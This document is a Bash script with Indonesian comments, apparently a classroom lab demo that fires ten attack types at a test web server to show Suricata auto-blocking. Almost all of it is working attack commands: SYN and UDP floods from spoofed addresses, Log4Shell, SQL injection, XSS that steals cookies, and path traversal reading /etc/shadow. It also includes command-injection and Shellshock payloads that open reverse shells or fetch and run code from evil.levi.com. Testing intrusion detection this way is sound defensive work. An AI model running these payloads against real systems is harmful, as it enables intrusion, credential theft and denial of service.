#!/usr/bin/env bash
# =============================================================================
#  atk.sh — 10 Jenis Serangan untuk Demo Dosen (Suricata Auto Block)
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash atk.sh
#
#  Pastikan Suricata & dummy_web sudah berjalan di target.
#  Jalankan dari mesin Kali Linux.
# =============================================================================

# ── Warna ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
atk()     { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[✓]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
            echo -e "${BOLD}${BLUE}  $*${NC}"
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}\n"; }

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET="192.168.216.128"
IFACE="eth0"

# IP palsu via raw socket (nmap/hping3 — tidak perlu ip addr add)
SPOOF_1="192.168.216.101"   # nmap port scan
SPOOF_2="192.168.216.102"   # hping3 SYN flood
SPOOF_3="192.168.216.103"   # hping3 UDP flood

# Virtual IP untuk curl (perlu ip addr add dulu)
VIRT_IP4="192.168.216.104"   # Log4Shell
VIRT_IP5="192.168.216.105"   # SQL Injection
VIRT_IP6="192.168.216.106"   # XSS
VIRT_IP7="192.168.216.107"   # LFI / Path Traversal
VIRT_IP8="192.168.216.108"   # RCE / Command Injection
VIRT_IP9="192.168.216.109"   # Shellshock CVE-2014-6271
VIRT_IP10="192.168.216.110"  # Web Scanner (Nikto UA)

ALL_VIRT=(${VIRT_IP4} ${VIRT_IP5} ${VIRT_IP6} ${VIRT_IP7} ${VIRT_IP8} ${VIRT_IP9} ${VIRT_IP10})

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${RED}Jalankan dengan: sudo bash atk.sh${NC}" && exit 1

# ── Cleanup otomatis saat exit ────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan virtual IP..."
    for ip in "${ALL_VIRT[@]}"; do
        ip addr del ${ip}/24 dev $IFACE 2>/dev/null
    done
    success "Bersih!"
}
trap cleanup EXIT

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
setup_virt_ip() {
    local ip=$1
    ip addr add ${ip}/24 dev $IFACE 2>/dev/null && info "Virtual IP ${ip} aktif"
    sleep 0.3
}

send_curl() {
    # $1=interface-ip, $2=url, rest=headers (-H "...")
    local vip=$1; local url=$2; shift 2
    curl --interface ${vip} "$@" "${url}" -s -o /dev/null -w "  → HTTP %{http_code}\n"
}

spam_curl() {
    # Kirim N request dari 1 IP → trigger auto-block
    local vip=$1; local url=$2; local n=${3:-5}; shift 3
    for i in $(seq 1 $n); do
        curl --interface ${vip} "$@" "${url}" -s -o /dev/null
        echo -e "  ${RED}Hit ${i}/${n}${NC} dari ${vip}"
        sleep 0.15
    done
    success "${vip} → harusnya sudah DIBLOK! Cek dashboard 🔒"
}

# ══════════════════════════════════════════════════════════════════════════════
# FUNGSI 10 SERANGAN
# ══════════════════════════════════════════════════════════════════════════════

# 1. nmap Port Scan ─────────────────────────────────────────────────────────────
do_1_portscan() {
    header "1️⃣  Port Scan — nmap Aggressive (dari ${SPOOF_1})"
    atk "nmap -S ${SPOOF_1} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn"
    nmap -S ${SPOOF_1} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn
    success "Port scan selesai!"
}

# 2. SYN Flood ─────────────────────────────────────────────────────────────────
do_2_synflood() {
    header "2️⃣  SYN Flood — hping3 (dari ${SPOOF_2})"
    atk "hping3 -S -a ${SPOOF_2} -I ${IFACE} -p 80 -c 20 ${TARGET}"
    hping3 -S -a ${SPOOF_2} -I ${IFACE} -p 80 -c 20 ${TARGET}
    success "SYN Flood selesai!"
}

# 3. UDP Flood ─────────────────────────────────────────────────────────────────
do_3_udpflood() {
    header "3️⃣  UDP Flood — hping3 (dari ${SPOOF_3})"
    atk "hping3 --udp -a ${SPOOF_3} -I ${IFACE} -p 53 -c 20 ${TARGET}"
    hping3 --udp -a ${SPOOF_3} -I ${IFACE} -p 53 -c 20 ${TARGET}
    success "UDP Flood selesai!"
}

# 4. Log4Shell CVE-2021-44228 ──────────────────────────────────────────────────
do_4_log4shell() {
    header "4️⃣  Log4Shell CVE-2021-44228 (dari ${VIRT_IP4})"
    setup_virt_ip ${VIRT_IP4}

    atk "Mengirim payload JNDI ldap..."
    send_curl ${VIRT_IP4} "http://${TARGET}/" \
        -H 'User-Agent: ${jndi:ldap://evil.levi.com/Log4Shell}'

    atk "Variasi via X-Api-Version..."
    send_curl ${VIRT_IP4} "http://${TARGET}/api" \
        -H 'X-Api-Version: ${jndi:ldap://attacker.levi.com/a}'

    atk "Spam 5x → trigger auto-block..."
    spam_curl ${VIRT_IP4} "http://${TARGET}/" 5 \
        -H 'User-Agent: ${jndi:ldap://evil.levi.com/exploit}'
}

# 5. SQL Injection ─────────────────────────────────────────────────────────────
do_5_sqli() {
    header "5️⃣  SQL Injection (dari ${VIRT_IP5})"
    setup_virt_ip ${VIRT_IP5}

    atk "Classic OR 1=1..."
    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%27%20OR%201%3D1--"

    atk "UNION SELECT dump..."
    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%20UNION%20SELECT%20null,table_name,null%20FROM%20information_schema.tables--"

    atk "Blind SQLi via sleep..."
    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%3BSELECT%20SLEEP(5)--"

    atk "Spam SQLi 5x → trigger block..."
    spam_curl ${VIRT_IP5} "http://${TARGET}/?id=1'%20OR%20'1'='1" 5
}

# 6. XSS (Cross-Site Scripting) ────────────────────────────────────────────────
do_6_xss() {
    header "6️⃣  XSS — Cross-Site Scripting (dari ${VIRT_IP6})"
    setup_virt_ip ${VIRT_IP6}

    atk "XSS via URL parameter..."
    send_curl ${VIRT_IP6} "http://${TARGET}/?search=<script>alert('xss')</script>"

    atk "XSS via Referer header..."
    send_curl ${VIRT_IP6} "http://${TARGET}/" \
        -H 'Referer: <script>document.location="http://evil.levi.com/?c="+document.cookie</script>'

    atk "XSS payload img onerror..."
    send_curl ${VIRT_IP6} "http://${TARGET}/?q=<img%20src=x%20onerror=alert(1)>"

    atk "Spam XSS 5x → trigger block..."
    spam_curl ${VIRT_IP6} "http://${TARGET}/?x=<script>alert(1)</script>" 5
}

# 7. LFI — Local File Inclusion / Path Traversal ───────────────────────────────
do_7_lfi() {
    header "7️⃣  LFI / Path Traversal (dari ${VIRT_IP7})"
    setup_virt_ip ${VIRT_IP7}

    atk "Path traversal /etc/passwd..."
    send_curl ${VIRT_IP7} "http://${TARGET}/../../../../etc/passwd"

    atk "PHP wrapper include..."
    send_curl ${VIRT_IP7} "http://${TARGET}/?file=php://filter/convert.base64-encode/resource=/etc/passwd"

    atk "Windows path traversal..."
    send_curl ${VIRT_IP7} "http://${TARGET}/?page=..%2F..%2F..%2Fetc%2Fshadow"

    atk "Spam LFI 5x → trigger block..."
    spam_curl ${VIRT_IP7} "http://${TARGET}/../../etc/passwd" 5
}

# 8. RCE — Remote Code Execution / Command Injection ──────────────────────────
do_8_rce() {
    header "8️⃣  RCE / Command Injection (dari ${VIRT_IP8})"
    setup_virt_ip ${VIRT_IP8}

    atk "Bash command via URL..."
    send_curl ${VIRT_IP8} "http://${TARGET}/?cmd=id;whoami;cat%20/etc/passwd"

    atk "Netcat reverse shell attempt..."
    send_curl ${VIRT_IP8} "http://${TARGET}/?cmd=nc%20-e%20/bin/bash%20evil.levi.com%204444"

    atk "wget download malware..."
    send_curl ${VIRT_IP8} "http://${TARGET}/" \
        -H 'X-Api-Version: ;wget http://evil.levi.com/shell.sh|bash'

    atk "Spam RCE 5x → trigger block..."
    spam_curl ${VIRT_IP8} "http://${TARGET}/?cmd=cat%20/etc/shadow" 5
}

# 9. Shellshock CVE-2014-6271 ─────────────────────────────────────────────────
do_9_shellshock() {
    header "9️⃣  Shellshock CVE-2014-6271 (dari ${VIRT_IP9})"
    setup_virt_ip ${VIRT_IP9}

    atk "Shellshock via User-Agent..."
    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/test.cgi" \
        -H $'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/evil.levi.com/4444 0>&1'

    atk "Shellshock via Referer..."
    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/status" \
        -H $'Referer: () { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd'

    atk "Shellshock via Cookie..."
    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/admin.cgi" \
        -H $'Cookie: () { :;}; /usr/bin/wget http://evil.levi.com/backdoor -O /tmp/bd'

    atk "Spam Shellshock 5x → trigger block..."
    spam_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/test.cgi" 5 \
        -H $'User-Agent: () { :;}; echo pwned'
}

# 10. Web Scanner (Nikto) ──────────────────────────────────────────────────────
do_10_scanner() {
    header "🔟  Web Scanner / Nikto Scan (dari ${VIRT_IP10})"
    setup_virt_ip ${VIRT_IP10}

    if command -v nikto &>/dev/null; then
        atk "Nikto web vulnerability scan..."
        nikto -h http://${TARGET} -id ${VIRT_IP10} -maxtime 30s -nointeractive 2>/dev/null
        success "Nikto scan selesai!"
    else
        warn "Nikto tidak tersedia, pakai curl manual dengan Nikto User-Agent..."

        atk "Simulasi Nikto via User-Agent..."
        send_curl ${VIRT_IP10} "http://${TARGET}/" \
            -H 'User-Agent: Mozilla/5.0 Nikto/2.1.6'
        send_curl ${VIRT_IP10} "http://${TARGET}/admin/"
        send_curl ${VIRT_IP10} "http://${TARGET}/phpmyadmin/"
        send_curl ${VIRT_IP10} "http://${TARGET}/.git/config"
        send_curl ${VIRT_IP10} "http://${TARGET}/wp-admin/"
        send_curl ${VIRT_IP10} "http://${TARGET}/xmlrpc.php"
        send_curl ${VIRT_IP10} "http://${TARGET}/.env"
        send_curl ${VIRT_IP10} "http://${TARGET}/config.php"
        send_curl ${VIRT_IP10} "http://${TARGET}/backup.sql"
        send_curl ${VIRT_IP10} "http://${TARGET}/server-status"

        atk "Spam scanner 5x → trigger block..."
        spam_curl ${VIRT_IP10} "http://${TARGET}/admin" 5 \
            -H 'User-Agent: Mozilla/5.0 Nikto/2.1.6'
    fi
}

# ── ALL ───────────────────────────────────────────────────────────────────────
do_all() {
    for ip in "${ALL_VIRT[@]}"; do
        setup_virt_ip ${ip}
    done
    do_1_portscan; sleep 1
    do_2_synflood; sleep 1
    do_3_udpflood; sleep 1
    do_4_log4shell; sleep 1
    do_5_sqli;     sleep 1
    do_6_xss;      sleep 1
    do_7_lfi;      sleep 1
    do_8_rce;      sleep 1
    do_9_shellshock; sleep 1
    do_10_scanner
}

# ══════════════════════════════════════════════════════════════════════════════
# BANNER & MENU
# ══════════════════════════════════════════════════════════════════════════════
header "🔥 SURICATA ATTACK DEMO — 10 JENIS SERANGAN"
echo -e "  Target    : ${BOLD}${TARGET}${NC}   (dummy_web Apache)"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo ""

header "Pilih Jenis Serangan"
echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan          — nmap Aggressive       (IP: ${SPOOF_1})"
echo -e "  ${BOLD} 2${NC}) 💥 SYN Flood           — hping3               (IP: ${SPOOF_2})"
echo -e "  ${BOLD} 3${NC}) 🌊 UDP Flood           — hping3               (IP: ${SPOOF_3})"
echo -e "  ${BOLD} 4${NC}) ☠️  Log4Shell           — CVE-2021-44228       (IP: ${VIRT_IP4})"
echo -e "  ${BOLD} 5${NC}) 💉 SQL Injection       — UNION/Blind/Sleep    (IP: ${VIRT_IP5})"
echo -e "  ${BOLD} 6${NC}) 🖥️  XSS                 — Script/Img Inject    (IP: ${VIRT_IP6})"
echo -e "  ${BOLD} 7${NC}) 📂 LFI/Path Traversal  — /etc/passwd          (IP: ${VIRT_IP7})"
echo -e "  ${BOLD} 8${NC}) 💻 RCE/Cmd Injection   — bash/wget/netcat     (IP: ${VIRT_IP8})"
echo -e "  ${BOLD} 9${NC}) 🐚 Shellshock          — CVE-2014-6271        (IP: ${VIRT_IP9})"
echo -e "  ${BOLD}10${NC}) 🕷️  Web Scanner          — Nikto scan           (IP: ${VIRT_IP10})"
echo -e "  ${BOLD} A${NC}) 🚀 SEMUA SEKALIGUS     — Full demo (1-10)"
echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-10 / A]: " CHOICE

case $CHOICE in
     1) do_1_portscan ;;
     2) do_2_synflood ;;
     3) do_3_udpflood ;;
     4) do_4_log4shell ;;
     5) do_5_sqli ;;
     6) do_6_xss ;;
     7) do_7_lfi ;;
     8) do_8_rce ;;
     9) do_9_shellshock ;;
    10) do_10_scanner ;;
    [Aa]) do_all ;;
     0) echo "Keluar."; exit 0 ;;
     *) warn "Pilihan tidak valid." ;;
esac

echo ""
success "Selesai! Cek dashboard → http://${TARGET}:8080"
echo ""
